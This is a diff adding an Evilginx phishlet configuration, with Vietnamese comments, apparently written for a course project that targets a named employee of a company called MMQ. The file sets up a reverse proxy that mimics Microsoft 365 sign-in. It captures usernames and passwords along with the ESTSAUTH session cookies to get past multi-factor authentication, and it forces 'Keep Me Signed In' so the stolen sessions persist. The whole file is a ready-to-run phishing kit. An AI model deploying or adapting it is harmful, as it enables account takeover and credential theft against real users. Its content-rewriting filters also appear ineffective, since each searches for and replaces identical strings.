@@ -1,0 +1,68 @@
+# ==============================================================================
+# PHISHLET ĐẶC TẢ DỰ ÁN IAO202: CÔNG TY CỔ PHẦN MMQ (OFFICE 365 / MICROSOFT SSO)
+# Tương thích: Evilginx 3.x (Phiên bản hệ thống: 3.3.0)
+# Nhóm phát triển: Quang & Hiếu
+# Mục tiêu kịch bản: Nhân viên Lan Hiếu (Lan.hieu@mmq.khanh)
+# ==============================================================================
+
+name: 'mmq_o365'
+author: 'Quang & Hieu (IAO Team)'
+min_ver: '3.1.0'
+
+# 1. Cấu hình định tuyến Proxy (Proxy Hosts)
+# Evilginx sẽ đón lưu lượng từ tên miền bẫy và chuyển tiếp trong suốt đến Microsoft
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'portal', orig_sub: 'portal', domain: 'microsoftonline.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'account', orig_sub: 'account', domain: 'microsoftonline.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msftauth.net', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'logincdn', orig_sub: 'logincdn', domain: 'msauth.net', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'live.com', session: false, is_landing: false, auto_filter: true}
+
+# 2. Bộ lọc thay thế nội dung (Sub Filters)
+sub_filters:
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+# 3. Danh sách Cookie cốt lõi quyết định việc Bypass MFA (Auth Tokens)
+# Khi nạn nhân duyệt qua bước MFA (Authenticator / OTP), Microsoft sẽ trả về các cookie này
+auth_tokens:
+  - domain: '.login.microsoftonline.com'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie']
+    type: 'cookie'
+  - domain: 'login.microsoftonline.com'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
+    type: 'cookie'
+
+# 4. Trích xuất thông tin đăng nhập (Credentials)
+credentials:
+  username:
+    key: '(login|UserName|email)'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: '(passwd|Password|accesspass)'
+    search: '(.*)'
+    type: 'post'
+
+# 5. Các URL xác nhận người dùng đã đăng nhập thành công
+auth_urls:
+  - '/common/SAS/ProcessAuth'
+  - '/kmsi'
+  - '/landing'
+  - '/owa/'
+
+# 6. Ép chọn "Duy trì đăng nhập" (Keep Me Signed In) để lấy Cookie vĩnh viễn
+force_post:
+  - path: '/kmsi'
+    search:
+      - {key: 'LoginOptions', search: '.*'}
+    force:
+      - {key: 'LoginOptions', value: '1'}
+    type: 'post'
+
+# 7. Trang đích mặc định ban đầu
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/'
